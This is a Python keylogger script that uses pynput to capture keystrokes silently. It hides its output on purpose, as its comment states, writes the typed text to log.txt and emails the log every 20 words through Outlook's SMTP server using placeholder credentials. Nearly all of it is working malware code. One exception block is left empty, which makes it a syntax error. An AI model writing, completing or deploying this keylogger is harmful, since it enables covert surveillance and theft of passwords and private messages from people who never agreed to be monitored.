import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

#Note: All of the print statements have been commented out to ensure that the keylogger execution is hidden from the user.

log_file = "log.txt"
keys = []
word_count = 0
WORD_LIMIT = 20

Email_Address = "<Email ID>"
Email_Password = "<Email Password>"

def on_press(key):
    global keys, word_count

    try:
        if hasattr(key, 'char') and key.char is not None:
            keys.append(key.char)
            # print(f'Alphanumeric key {key.char} pressed')
            write_file(keys)
        
        if key == Key.space:
            word_count += 1
            keys.append(' ')
            # print(f"Space detected. Word count: {word_count}")
            write_file(keys)
            if word_count >= WORD_LIMIT:
                # print("Word limit reached. Sending email...")
                send_email()  
                word_count = 0  
                keys.clear()  
    
    except AttributeError:
        # print(f'Special key {key} pressed')


def write_file(keys):
    with open(log_file, 'w') as f:
        f.write(''.join(keys))


def send_email():
    try:
        msg = MIMEMultipart()
        msg['From'] = Email_Address
        msg['To'] = Email_Address
        msg['Subject'] = 'Key Stroke Data - ' + str(datetime.now())

        body = 'Keystroke data captured and attached.'
        msg.attach(MIMEText(body, 'plain'))

        with open(log_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {log_file}')
            msg.attach(part)

        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        server.starttls()  # Secure the connection
        server.login(Email_Address, Email_Password)

        server.sendmail(Email_Address, Email_Address, msg.as_string())
        server.quit()

        # print('Email sent successfully with the log file attached.')

    except Exception as e:
        print(f"Error occurred while sending email: {e}")


def on_release(key):
    if key == Key.esc:
        # print("Escape key pressed. Exiting...")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
